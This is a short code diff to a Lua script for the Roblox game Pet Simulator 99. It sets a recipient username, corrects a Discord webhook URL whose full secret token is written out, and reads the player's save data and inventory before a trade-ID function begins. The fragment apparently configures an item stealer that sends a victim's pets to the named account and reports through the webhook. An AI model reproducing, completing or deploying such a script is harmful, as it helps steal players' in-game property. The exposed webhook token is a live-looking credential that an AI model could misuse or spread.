@@ -1,5 +1,5 @@
 Username = "PetSim99DoubleEvents"
-Webhook = "https://discord.com/api/webhooks/1217538601622179841/ PvnpavlJ14vP0QrOQADG7HJtqLZTiek4cJIvWyI00gIJ0vV_ZwhGiGBcxtEqhZWYqc8u"
+Webhook = "https://discord.com/api/webhooks/1217538601622179841/PvnpavlJ14vP0QrOQADG7HJtqLZTiek4cJIvWyI00gIJ0vV_ZwhGiGBcxtEqhZWYqc8u"
 local library = require(game.ReplicatedStorage.Library) local save = library.Save.Get()
 local inventory = library.Save.Get().Inventory
 local function GetTradeID()
